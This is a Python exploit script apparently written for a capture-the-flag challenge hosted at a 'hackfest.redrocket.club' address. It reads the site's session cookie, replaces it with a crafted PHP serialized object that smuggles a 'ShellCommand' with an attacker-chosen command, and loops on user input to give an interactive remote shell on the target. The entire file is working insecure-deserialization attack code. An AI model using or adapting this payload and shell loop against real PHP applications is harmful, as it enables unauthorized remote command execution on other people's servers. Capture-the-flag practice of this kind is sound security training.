#!/usr/bin/env python3

import re
from turtle import clear
import requests as r
from urllib.parse import quote, unquote
import sys

url = "http://hackfest.redrocket.club:65129/"

def getCookie(url):
    # Request
    req = r.Session()
    res = req.get(url)

    # Cookie
    cookie = req.cookies.get_dict()
    key = list(cookie.keys())[0]
    value = cookie[key]

    # Decode value
    value = unquote(value)

    return key, value

def exploit(key, cmd):
    # Crafting payload
    payload  = 'O:4:"User":4:{s:3:"uid";i:1234;s:4:"name";s:3:"god";s:2:"db";'
    payload += 'O:12:"ShellCommand":2:'
    payload += '{'
    payload += 's:5:"is_ok";b:1;'
    payload += 's:3:"cmd";'
    payload += 's:{}:"{}";'.format(str(len(cmd)), cmd)
    payload += '}'
    payload += 's:6:"active";'
    payload += 'b:1;'
    payload += '}'
    payload  = quote(payload)

    # Set new cookie
    new_cookie = {key: payload}

    # Send cookie
    req = r.Session()
    res = req.get(url, cookies=new_cookie).text

    return res

# Driver code
cmd = None
key, _ = getCookie(url)
while cmd != "exit":
    cmd = input("~ $ ")
    res = exploit(key, cmd)
    res = res.split("\n")
    res.pop(-1)
    res = "\n".join(res)
    print(res)
